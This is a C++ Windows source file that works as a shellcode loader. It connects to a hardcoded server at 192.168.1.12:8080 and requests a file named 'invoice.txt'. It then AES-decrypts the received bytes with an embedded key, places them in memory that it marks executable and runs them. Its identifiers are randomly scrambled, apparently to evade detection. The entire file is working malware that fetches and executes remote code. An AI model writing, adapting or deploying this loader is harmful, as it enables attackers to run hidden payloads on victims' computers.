#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>

// Define the shellcode function signature
typedef void (*mmsUbBZmpSL)();

bool HSXaBzAEMsmM(const char* CSQpTfUWF, int qZHAiSObQH, const char* Random4, char*& ZqGOz, size_t& YcNnTdO) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return false;
    }

    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == INVALID_SOCKET) {
        WSACleanup();
        return false;
    }

    sockaddr_in serverAddress{};
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(qZHAiSObQH);
    serverAddress.sin_addr.s_addr = inet_addr(CSQpTfUWF);

    if (serverAddress.sin_addr.s_addr == INADDR_NONE) {
        closesocket(clientSocket);
        WSACleanup();
        return false;
    }

    if (connect(clientSocket, (struct sockaddr*)&serverAddress, sizeof(serverAddress)) < 0) {
        closesocket(clientSocket);
        WSACleanup();
        return false;
    }

    // Send the length of the file path first
    size_t Random4Len = strlen(Random4);
    send(clientSocket, reinterpret_cast<char*>(&Random4Len), sizeof(Random4Len), 0);

    // Send the file path to the server
    send(clientSocket, Random4, Random4Len, 0);

    int fileSize;
    int bytesRead = recv(clientSocket, reinterpret_cast<char*>(&fileSize), sizeof(fileSize), 0);
    if (bytesRead != sizeof(fileSize)) {
        closesocket(clientSocket);
        WSACleanup();
        return false;
    }

    fileSize = ntohl(fileSize);

    // Receive and save the binary data in a dynamically allocated buffer
    ZqGOz = new char[fileSize];
    if (ZqGOz == nullptr) {
        closesocket(clientSocket);
        WSACleanup();
        return false;
    }

    size_t totalSize = 0;
    while (totalSize < fileSize) {
        bytesRead = recv(clientSocket, ZqGOz + totalSize, fileSize - totalSize, 0);
        if (bytesRead <= 0) {
            delete[] ZqGOz;
            closesocket(clientSocket);
            WSACleanup();
            return false;
        }
        totalSize += bytesRead;
    }

    // Close the socket
    closesocket(clientSocket);

    YcNnTdO = totalSize;

    return true;
}

int tgLHLotnCNGU(char* YCFvYJweWXpxv, unsigned int YCFvYJweWXpxv_len, char* DGQygzYiTL, size_t DGQygzYiTLlen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return -1;
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        return -1;
    }
    if (!CryptHashData(hHash, (BYTE*)DGQygzYiTL, (DWORD)DGQygzYiTLlen, 0)) {
        return -1;
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        return -1;
    }

    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, YCFvYJweWXpxv, &YCFvYJweWXpxv_len)) {
        return -1;
    }

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

    return 0;
}

char DGQygzYiTL[] =  { 0x88, 0x86, 0x7, 0x50, 0x68, 0x8d, 0xb7, 0xfb, 0x11, 0xb7, 0xdd, 0x16, 0x93, 0x87, 0x14, 0x20 };;

int main() {
    const char* CSQpTfUWF = "192.168.1.12";  // Replace with the actual server IP
    int qZHAiSObQH = 8080;               // Replace with the actual server port
    const char* Random4 = "invoice.txt";  // Replace with the actual file path on the server

    char* ZqGOz;
    size_t YcNnTdO;

    if (HSXaBzAEMsmM(CSQpTfUWF, qZHAiSObQH, Random4, ZqGOz, YcNnTdO)) {
        tgLHLotnCNGU((char*)ZqGOz, YcNnTdO, DGQygzYiTL, sizeof(DGQygzYiTL));

        // Allocate executable memory with READ, WRITE permissions
        LPVOID executableMemory = VirtualAlloc(NULL, YcNnTdO, MEM_COMMIT, PAGE_READWRITE);
        if (executableMemory == NULL) {
            delete[] ZqGOz;
            return 1;
        }

        // Copy binary data to the executable memory
        memcpy(executableMemory, ZqGOz, YcNnTdO);

        // Change the protection to PAGE_EXECUTE_READ
        DWORD oldProtect;
        if (!VirtualProtect(executableMemory, YcNnTdO, PAGE_EXECUTE_READ, &oldProtect)) {
            VirtualFree(executableMemory, 0, MEM_RELEASE);
            delete[] ZqGOz;
            return 1;
        }

        // Create a function pointer to the shellcode
        mmsUbBZmpSL zkPPzcyaB = reinterpret_cast<mmsUbBZmpSL>(executableMemory);

        // Call the shellcode function
        zkPPzcyaB();
    } else {
        return 1;
    }

    return 0;
}

